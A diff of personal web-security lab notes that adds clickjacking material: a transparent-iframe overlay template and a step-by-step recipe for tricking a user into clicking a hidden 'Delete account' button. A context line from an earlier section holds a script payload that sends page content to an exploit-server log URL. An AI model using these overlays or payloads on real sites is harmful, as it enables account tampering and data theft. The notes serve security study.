@@ -73,6 +73,7 @@
 - JS Link Finder: Scanning js files for endpoint links [API testing]
 - Content Type Converter: JSON to XML; XMl to JSON; Body param to JSON; Body param to XML [API testing]
 - Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing]
+- Clickbandit:
   
 ## SQL Injection
 **How to detect**     
@@ -2089,12 +2090,70 @@ Content-Type: application/json
        {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
     ```
-  - 
 
 ## Clickjacking
-Details about Clickjacking...
+- Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain.
+- Use [Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit): Use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay
+- 
+
+**Construct a basic clickjacking attack**
+'''
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:128px;
+			height:128px;
+			opacity:0.00001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:300px;
+			height:400px;
+			z-index:1;
+			}
+	</style>
+</head>
+...
+<body>
+	<div id="decoy_website">
+	...decoy web content here...
+	</div>
+	<iframe id="target_website" src="https://vulnerable-website.com">
+	</iframe>
+</body>
+'''
 
 ### Clickjacking Lab
+- **Basic clickjacking** with CSRF token protection
+  '''
+  <style>
+    iframe {
+        position:relative;
+        width:$width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index: 1;
+    }
+   </style>
+   <div>Test me</div>
+   <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+  '''
+  - Replace **YOUR-LAB-ID** in the iframe src attribute with your unique lab ID   
+  - Substitute suitable pixel values for the **$height_value** and **$width_value** variables of the iframe (we suggest 700px and 500px respectively).   
+  - Substitute suitable pixel values for the **$top_value** and **$side_value** variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).   
+  - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.   
+- ddd
+- ddd
+- ddd
+- ddd
 
 ## XSS (Cross-Site Scripting)
 Details about XSS...
